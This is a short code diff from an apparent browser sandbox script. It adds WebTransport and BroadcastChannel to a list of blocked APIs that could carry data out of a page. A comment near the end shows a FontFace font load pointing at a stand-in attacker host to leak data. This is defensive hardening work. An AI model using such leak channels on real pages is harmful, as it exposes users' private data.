@@ -39,6 +39,8 @@ block(window.EventSource, "window.EventSource");
 block(window.Worker, "window.Worker");
 block(window.SharedWorker, "window.SharedWorker");
 block(window.RTCPeerConnection, "window.RTCPeerConnection");
+block(window.WebTransport, "WebTransport");
+block(window.BroadcastChannel, "BroadcastChannel");
 block(method(Navigator.prototype, "sendBeacon"), "Navigator.sendBeacon");
 
 // `new FontFace(family, "url(https://attacker.example/?leak=...)").load()`
